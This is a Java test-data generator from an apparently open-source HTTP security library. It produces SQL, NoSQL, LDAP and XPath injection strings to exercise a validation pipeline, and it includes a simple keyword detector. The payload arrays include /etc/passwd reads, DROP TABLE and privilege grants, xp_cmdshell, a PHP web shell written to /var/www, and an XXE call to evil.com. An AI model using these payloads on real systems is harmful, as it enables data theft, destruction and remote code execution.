/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;

/**
 * Generates SQL injection attack patterns for security testing.
 * 
 * <p>
 * This generator creates comprehensive SQL injection attack vectors designed to test
 * the security validation pipeline's ability to detect and prevent SQL injection attacks.
 * SQL injection is one of the most dangerous web application security vulnerabilities,
 * allowing attackers to manipulate database queries and potentially access, modify,
 * or delete sensitive data.
 * </p>
 * 
 * <h3>Attack Types Generated</h3>
 * <ul>
 *   <li>Classic SQL Injection - Union-based attacks</li>
 *   <li>Boolean-based Blind SQL Injection</li>
 *   <li>Time-based Blind SQL Injection</li>
 *   <li>Error-based SQL Injection</li>
 *   <li>Second-order SQL Injection</li>
 *   <li>NoSQL Injection - MongoDB, CouchDB attacks</li>
 *   <li>LDAP Injection via SQL context</li>
 *   <li>SQL Comment Injection</li>
 *   <li>Stacked Queries Attack</li>
 *   <li>Database-specific Attacks (MySQL, PostgreSQL, MSSQL, Oracle)</li>
 *   <li>Function-based Injection</li>
 *   <li>XML/XPath Injection in SQL context</li>
 *   <li>SQL Truncation Attacks</li>
 *   <li>Polyglot SQL Injection</li>
 *   <li>SQL Injection via HTTP Headers</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li>OWASP Top 10 - A03:2021 Injection</li>
 *   <li>CWE-89: Improper Neutralization of Special Elements in SQL Commands</li>
 *   <li>CWE-564: SQL Injection: Hibernate</li>
 *   <li>CWE-643: Improper Neutralization of Data within XPath Expressions</li>
 *   <li>NIST SP 800-53 - SI-10 Information Input Validation</li>
 *   <li>SANS Top 25 Most Dangerous Software Errors</li>
 *   <li>SQL Injection Prevention Cheat Sheet (OWASP)</li>
 *   <li>Database Security Guidelines (CIS)</li>
 * </ul>
 * 
 * Implements: Generator for Task T12 from HTTP verification specification
 * 
 * @author Claude Code Generator
 * @since 2.5
 */
public class SqlInjectionAttackGenerator implements TypedGenerator<String> {

    private final TypedGenerator<String> basePatternGen = Generators.fixedValues(
            "/search",
            "/login",
            "/user",
            "/profile",
            "/admin",
            "/api/users",
            "/products",
            "/orders",
            "/reports",
            "/data",
            "/query",
            "/filter",
            "/find",
            "/list",
            "/view"
    );

    private final TypedGenerator<String> attackTypeGen = Generators.fixedValues(
            "classic_union_injection",      // UNION SELECT attacks
            "boolean_blind_injection",      // True/False based attacks
            "time_blind_injection",         // Time delay attacks
            "error_based_injection",        // Error message exploitation
            "second_order_injection",       // Stored and executed later
            "nosql_injection",              // NoSQL database attacks
            "ldap_injection",               // LDAP via SQL context
            "comment_injection",            // SQL comment manipulation
            "stacked_queries",              // Multiple query execution
            "database_specific_attacks",    // DB-specific functions
            "function_injection",           // SQL function exploitation
            "xml_xpath_injection",          // XML/XPath in SQL
            "truncation_attacks",           // SQL truncation bugs
            "polyglot_sql_injection",       // Multi-language attacks
            "header_based_injection"        // HTTP header SQL injection
    );

    @Override
    public String next() {
        String basePattern = basePatternGen.next();
        String attackType = attackTypeGen.next();

        return switch (attackType) {
            case "classic_union_injection" -> createClassicUnionInjection(basePattern);
            case "boolean_blind_injection" -> createBooleanBlindInjection(basePattern);
            case "time_blind_injection" -> createTimeBlindInjection(basePattern);
            case "error_based_injection" -> createErrorBasedInjection(basePattern);
            case "second_order_injection" -> createSecondOrderInjection(basePattern);
            case "nosql_injection" -> createNoSqlInjection(basePattern);
            case "ldap_injection" -> createLdapInjection(basePattern);
            case "comment_injection" -> createCommentInjection(basePattern);
            case "stacked_queries" -> createStackedQueries(basePattern);
            case "database_specific_attacks" -> createDatabaseSpecificAttacks(basePattern);
            case "function_injection" -> createFunctionInjection(basePattern);
            case "xml_xpath_injection" -> createXmlXpathInjection(basePattern);
            case "truncation_attacks" -> createTruncationAttacks(basePattern);
            case "polyglot_sql_injection" -> createPolyglotSqlInjection(basePattern);
            case "header_based_injection" -> createHeaderBasedInjection(basePattern);
            default -> basePattern;
        };
    }

    /**
     * Create classic UNION-based SQL injection attacks.
     */
    private String createClassicUnionInjection(String pattern) {
        String[] unionAttacks = {
                // Basic UNION attacks
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username,password FROM users--",
                "' UNION ALL SELECT null,null,null--",

                // UNION with different column counts
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3,4,5--",

                // UNION with information gathering
                "' UNION SELECT database(),user(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",

                // UNION with file operations
                "' UNION SELECT load_file('/etc/passwd')--",
                "' UNION SELECT 1 INTO OUTFILE '/tmp/result.txt'--",

                // UNION with hex encoding
                "' UNION SELECT 0x61646D696E--", // 'admin' in hex
                
                // UNION with concatenation
                "' UNION SELECT CONCAT(username,0x3a,password) FROM users--",

                // UNION with subqueries
                "' UNION SELECT (SELECT password FROM users WHERE username='admin')--"
        };

        String attack = unionAttacks[Math.abs(pattern.hashCode()) % unionAttacks.length];
        return pattern + "?id=" + attack;
    }

    /**
     * Create boolean-based blind SQL injection attacks.
     */
    private String createBooleanBlindInjection(String pattern) {
        String[] blindAttacks = {
                // Basic boolean tests
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",

                // Substring extraction
                "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",

                // Database version detection
                "' AND @@version LIKE '5%'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",

                // Table existence detection
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND EXISTS(SELECT * FROM admin)--",

                // Character-by-character extraction
                "' AND (SELECT ASCII(MID((SELECT password FROM users WHERE id=1),1,1)))>96--",

                // Length detection
                "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--",

                // Conditional responses
                "' AND IF(1=1,SLEEP(0),SLEEP(5))--",

                // Case when conditions
                "' AND (CASE WHEN 1=1 THEN 'true' ELSE 'false' END)='true'--"
        };

        String attack = blindAttacks[Math.abs(pattern.hashCode()) % blindAttacks.length];
        return pattern + "?search=" + attack;
    }

    /**
     * Create time-based blind SQL injection attacks.
     */
    private String createTimeBlindInjection(String pattern) {
        String[] timeAttacks = {
                // MySQL time delays
                "'; SELECT SLEEP(5)--",
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",

                // PostgreSQL time delays
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT pg_sleep(5))IS NULL--",

                // MSSQL time delays
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--",

                // Oracle time delays
                "'; SELECT dbms_lock.sleep(5) FROM dual--",
                "' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual) IS NULL--",

                // SQLite time delays (CPU intensive)
                "' AND (SELECT COUNT(*) FROM (SELECT * FROM sqlite_master))>100000--",

                // Conditional time delays
                "' AND IF(ASCII(SUBSTRING(password,1,1))>96,SLEEP(5),0) FROM users WHERE username='admin'--",

                // Nested time delays
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5)--",

                // Heavy computation delays
                "' AND (SELECT * FROM (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C))--"
        };

        String attack = timeAttacks[Math.abs(pattern.hashCode()) % timeAttacks.length];
        return pattern + "?filter=" + attack;
    }

    /**
     * Create error-based SQL injection attacks.
     */
    private String createErrorBasedInjection(String pattern) {
        String[] errorAttacks = {
                // MySQL error-based extraction
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users),0x7e),1)--",

                // PostgreSQL error-based
                "' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RANDOM()*2))x FROM information_schema.tables GROUP BY x)a)--",

                // MSSQL error-based
                "' AND CONVERT(INT,(SELECT password FROM users WHERE username='admin'))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND()*2))x FROM sysobjects GROUP BY x)a)--",

                // Oracle error-based
                "' AND UTLXML.getxml('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://evil.com/\"> %remote;]>') IS NULL--",

                // Division by zero errors
                "' AND 1/0--",
                "' AND 1/(SELECT 0)--",

                // Type conversion errors
                "' AND 'a'=0--",
                "' AND CONVERT(INT,@@version)--",

                // Subquery errors
                "' AND (SELECT * FROM (SELECT password FROM users)x(password,password))--",

                // XML errors
                "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT password FROM users WHERE username='admin')))--"
        };

        String attack = errorAttacks[Math.abs(pattern.hashCode()) % errorAttacks.length];
        return pattern + "?param=" + attack;
    }

    /**
     * Create second-order SQL injection attacks.
     */
    private String createSecondOrderInjection(String pattern) {
        String[] secondOrderAttacks = {
                // Username storage for later exploitation
                "admin' OR 1=1--",
                "user'; DROP TABLE users--",
                "test' UNION SELECT password FROM admin--",

                // Email-based second order
                "test@evil.com'; UPDATE users SET password='hacked' WHERE username='admin'--",

                // Comment-based second order
                "Nice post!'; INSERT INTO admin (username,password) VALUES ('hacker','pass')--",

                // Profile update second order
                "John Doe'; UPDATE profiles SET role='admin' WHERE user_id=1--",

                // Search history second order
                "search'; DELETE FROM logs WHERE user_id=1--",

                // File name second order
                "document.pdf'; SELECT * FROM sensitive_data INTO OUTFILE '/tmp/leaked.txt'--",

                // Session data second order
                "session'; UPDATE sessions SET user_id=1 WHERE session_id='current'--",

                // Multi-step attack
                "step1'; CREATE TABLE temp AS SELECT * FROM users--",

                // Delayed execution
                "trigger'; CREATE TRIGGER evil AFTER INSERT ON logs FOR EACH ROW BEGIN DELETE FROM users; END--",

                // Stored procedure call
                "data'; CALL admin_function('evil_param')--"
        };

        String attack = secondOrderAttacks[Math.abs(pattern.hashCode()) % secondOrderAttacks.length];
        return pattern + "?username=" + attack;
    }

    /**
     * Create NoSQL injection attacks.
     */
    private String createNoSqlInjection(String pattern) {
        String[] noSqlAttacks = {
                // MongoDB injection
                "[$ne]=null",
                "[$gt]=",
                "[$regex]=.*",
                "[$where]=function(){return true}",

                // CouchDB injection
                "?key=\"\\u0000\"",
                "?startkey=\"\"&endkey=\"\\ufff0\"",

                // MongoDB operator injection
                "admin\",\"$ne\":\"xyz\"}//",
                "admin\",\"password\":{\"$ne\":\"xyz\"}}//",

                // JSON NoSQL injection
                "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
                "{\"$or\":[{\"username\":\"admin\"},{\"role\":\"admin\"}]}",

                // CouchDB view injection
                "function(doc){if(doc.type=='user')return true;}",

                // MongoDB aggregation injection
                "[{\"$match\":{\"$where\":\"function(){return true}\"}}]",

                // Redis injection (via SQL context)
                "'; SET evil 'hacked'; GET evil--",

                // ElasticSearch injection
                "{\"query\":{\"match_all\":{}}}",

                // Cassandra CQL injection
                "'; DROP TABLE users;--"
        };

        String attack = noSqlAttacks[Math.abs(pattern.hashCode()) % noSqlAttacks.length];
        return pattern + "?query=" + attack;
    }

    /**
     * Create LDAP injection attacks via SQL context.
     */
    private String createLdapInjection(String pattern) {
        String[] ldapAttacks = {
                // Basic LDAP injection
                "admin)(&)",
                "admin)(|(uid=*))",
                "admin)(|(objectClass=*))",

                // LDAP wildcard injection
                "*)(uid=*))(|(uid=*",
                "admin*",
                "*))%00",

                // LDAP bind attacks
                "cn=admin,dc=example,dc=com)(&(uid=*))",

                // LDAP search filter injection
                "*))|(&(objectClass=user)(cn=*",

                // LDAP attribute injection
                "admin)(mail=*))%00",

                // Combined SQL-LDAP attack
                "'; SELECT * FROM ldap_users WHERE dn='cn=admin)(|(uid=*'--",

                // LDAP enumeration
                "a*)(|(cn=a*",

                // LDAP authentication bypass
                "admin)(%26)",
                "*))(|(userPassword=*"
        };

        String attack = ldapAttacks[Math.abs(pattern.hashCode()) % ldapAttacks.length];
        return pattern + "?ldap_query=" + attack;
    }

    /**
     * Create SQL comment injection attacks.
     */
    private String createCommentInjection(String pattern) {
        String[] commentAttacks = {
                // Comment out WHERE clause
                "admin'--",
                "admin'#",
                "admin'/*",

                // Multi-line comment injection
                "admin'/**/OR/**/1=1/**/--",
                "admin'/*comment*/UNION/*comment*/SELECT/*comment*/1--",

                // Nested comment injection
                "admin'/*/*/OR/*/*/1=1/*/*/--",

                // Comment with payload
                "admin';/*payload*/SELECT/*payload*/password/*payload*/FROM/*payload*/users/*payload*/--",

                // URL encoded comments
                "admin'%2D%2D",
                "admin'%23",
                "admin'%2F%2A",

                // Platform-specific comments
                "admin'--+",  // MySQL
                "admin';--",  // MSSQL
                "admin'#",    // MySQL/PostgreSQL
                
                // Comment evasion
                "admin'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL/**/--",

                // Comment with line feed
                "admin'--\n",
                "admin'#\n"
        };

        String attack = commentAttacks[Math.abs(pattern.hashCode()) % commentAttacks.length];
        return pattern + "?user=" + attack;
    }

    /**
     * Create stacked queries attacks.
     */
    private String createStackedQueries(String pattern) {
        String[] stackedAttacks = {
                // Basic stacked queries
                "'; SELECT 1--",
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('hacker','pass')--",

                // Multiple statements
                "'; UPDATE users SET password='hacked' WHERE username='admin'; SELECT 1--",

                // Administrative commands
                "'; CREATE USER hacker IDENTIFIED BY 'pass'--",
                "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--",

                // Data exfiltration
                "'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--",

                // Database manipulation
                "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(100)--",

                // System commands (MySQL)
                "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",

                // Trigger creation
                "'; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW INSERT INTO admin VALUES (NEW.username, NEW.password)--",

                // Stored procedure creation
                "'; CREATE PROCEDURE GetData() BEGIN SELECT * FROM sensitive_table; END--",

                // Transaction manipulation
                "'; BEGIN; UPDATE users SET role='admin' WHERE username='hacker'; COMMIT--",

                // Conditional execution
                "'; IF @@version LIKE '%mysql%' SELECT 'MySQL' ELSE SELECT 'Other'--"
        };

        String attack = stackedAttacks[Math.abs(pattern.hashCode()) % stackedAttacks.length];
        return pattern + "?action=" + attack;
    }

    /**
     * Create database-specific attacks.
     */
    private String createDatabaseSpecificAttacks(String pattern) {
        String[] dbSpecificAttacks = {
                // MySQL specific
                "' AND @@version--",
                "' UNION SELECT load_file('/etc/passwd')--",
                "' INTO OUTFILE '/var/www/backdoor.php'--",

                // PostgreSQL specific
                "' AND version()='PostgreSQL'--",
                "'; COPY users FROM '/tmp/evil.csv'--",
                "' UNION SELECT pg_read_file('/etc/passwd')--",

                // MSSQL specific
                "' AND @@version LIKE '%Microsoft%'--",
                "'; EXEC master..xp_cmdshell 'dir'--",
                "' UNION SELECT * FROM OPENROWSET('SQLOLEDB','server';'uid';'pwd','SELECT * FROM users')--",

                // Oracle specific
                "' AND banner LIKE '%Oracle%' FROM v$version--",
                "' UNION SELECT utl_file.get_line('DIRECTORY','filename') FROM dual--",

                // SQLite specific
                "' AND sqlite_version()>='3'--",
                "' UNION SELECT tbl_name FROM sqlite_master--",

                // Access specific
                "' AND 1=IIF(1=1,1,0)--",
                "' UNION SELECT * FROM MSysObjects--",

                // DB2 specific
                "' AND USER='DB2ADMIN'--",
                "' UNION SELECT * FROM sysibm.systables--",

                // Sybase specific
                "' AND @@version LIKE '%Sybase%'--",
                "' UNION SELECT name FROM sysobjects--"
        };

        String attack = dbSpecificAttacks[Math.abs(pattern.hashCode()) % dbSpecificAttacks.length];
        return pattern + "?db_test=" + attack;
    }

    /**
     * Create function-based SQL injection attacks.
     */
    private String createFunctionInjection(String pattern) {
        String[] functionAttacks = {
                // String functions
                "' AND ASCII(SUBSTRING(password,1,1))>64 FROM users WHERE username='admin'--",
                "' AND LENGTH((SELECT password FROM users WHERE username='admin'))>5--",
                "' AND LOCATE('admin',(SELECT username FROM users))>0--",

                // Mathematical functions
                "' AND FLOOR(RAND(0)*2)=1--",
                "' AND CEILING((SELECT COUNT(*) FROM users)/2)>1--",

                // Date functions
                "' AND YEAR(NOW())=2023--",
                "' AND DATEDIFF(NOW(),(SELECT created_date FROM users WHERE username='admin'))>365--",

                // Conditional functions
                "' AND IF((SELECT COUNT(*) FROM users)>0,'true','false')='true'--",
                "' AND CASE WHEN 1=1 THEN 'true' ELSE 'false' END='true'--",

                // Aggregate functions
                "' AND COUNT(*)>0 FROM users--",
                "' AND MAX(user_id)>100 FROM users--",

                // System functions
                "' AND USER()='root'--",
                "' AND DATABASE()='production'--",

                // Conversion functions
                "' AND CAST((SELECT password FROM users WHERE username='admin') AS CHAR)='secret'--",
                "' AND CONVERT((SELECT COUNT(*) FROM users),CHAR)='100'--"
        };

        String attack = functionAttacks[Math.abs(pattern.hashCode()) % functionAttacks.length];
        return pattern + "?func_test=" + attack;
    }

    /**
     * Create XML/XPath injection in SQL context.
     */
    private String createXmlXpathInjection(String pattern) {
        String[] xmlAttacks = {
                // XPath injection
                "' OR 1=1 or ''='",
                "'] | //user/* | //password/* | //*['",
                "admin' and count(//user[position()=1])=1 and '1'='1",

                // XML entity injection
                "'; SELECT EXTRACTVALUE('<xml><!ENTITY xxe SYSTEM \"file:///etc/passwd\">xxe;</xml>','//xxe')--",

                // XPath authentication bypass
                "admin'] | //user[password='secret' or '1'='1",

                // XPath blind injection
                "'] | //user[position()=1 and substring(password,1,1)='a'] | //*['",

                // XML CDATA injection
                "'; SELECT '<![CDATA[' + (SELECT password FROM users WHERE username='admin') + ']]>'--",

                // XPath error-based
                "'] | //user[contains(password,'error')] | //*['"
        };

        String attack = xmlAttacks[Math.abs(pattern.hashCode()) % xmlAttacks.length];
        return pattern + "?xml_query=" + attack;
    }

    /**
     * Create SQL truncation attacks.
     */
    private String createTruncationAttacks(String pattern) {
        String[] truncationAttacks = {
                // Basic truncation
                "admin" + "A".repeat(100) + "' OR 1=1--",

                // Unicode truncation
                "admin\u0000' OR 1=1--",

                // Multi-byte truncation
                "adminÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ' OR 1=1--",

                // Space padding truncation
                "admin" + " ".repeat(200) + "' OR 1=1--",

                // Character encoding truncation
                "admin%00%00%00%00%00' OR 1=1--"
        };

        String attack = truncationAttacks[Math.abs(pattern.hashCode()) % truncationAttacks.length];
        return pattern + "?truncate=" + attack;
    }

    /**
     * Create polyglot SQL injection attacks.
     */
    private String createPolyglotSqlInjection(String pattern) {
        String[] polyglotAttacks = {
                // SQL + JavaScript
                "'; alert('SQL+XSS'); SELECT 1--",

                // SQL + NoSQL
                "' OR 1=1 AND '1'='1'; db.users.find()--",

                // SQL + LDAP
                "admin' OR 1=1--)(|(uid=*))",

                // SQL + XML
                "' UNION SELECT '<xml><user>admin</user></xml>' WHERE 1=1--",

                // Universal polyglot
                "' OR 1=1# AND '1'='1'; DROP TABLE users; db.collection.drop(); --"
        };

        String attack = polyglotAttacks[Math.abs(pattern.hashCode()) % polyglotAttacks.length];
        return pattern + "?polyglot=" + attack;
    }

    /**
     * Create HTTP header-based SQL injection.
     */
    private String createHeaderBasedInjection(String pattern) {
        String[] headerAttacks = {
                // User-Agent injection
                "Mozilla/5.0' OR 1=1--",

                // X-Forwarded-For injection
                "127.0.0.1' UNION SELECT password FROM users--",

                // Cookie injection
                "sessionid=abc123' OR 1=1--",

                // Referer injection
                "http://evil.com/' OR 1=1--",

                // Custom header injection
                "header_value' AND 1=1--"
        };

        String attack = headerAttacks[Math.abs(pattern.hashCode()) % headerAttacks.length];
        return pattern + "?header=" + attack;
    }

    /**
     * Check if a string contains SQL injection patterns.
     */
    public boolean containsSqlInjectionPatterns(String input) {
        if (input == null) {
            return false;
        }

        String lowercaseInput = input.toLowerCase();

        // Check for SQL keywords
        String[] sqlKeywords = {"union", "select", "insert", "update", "delete", "drop", "create", "alter"};
        for (String keyword : sqlKeywords) {
            if (lowercaseInput.contains(keyword)) {
                return true;
            }
        }

        // Check for SQL operators
        if (lowercaseInput.contains(" or ") || lowercaseInput.contains(" and ") ||
                lowercaseInput.contains("1=1") || lowercaseInput.contains("1=2")) {
            return true;
        }

        // Check for SQL comments
        if (lowercaseInput.contains("--") || lowercaseInput.contains("#") ||
                lowercaseInput.contains("/*")) {
            return true;
        }

        // Check for common SQL injection patterns
        if (lowercaseInput.contains("' or") || lowercaseInput.contains("\" or") ||
                lowercaseInput.contains("' and") || lowercaseInput.contains("\" and")) {
            return true;
        }

        return false;
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }
}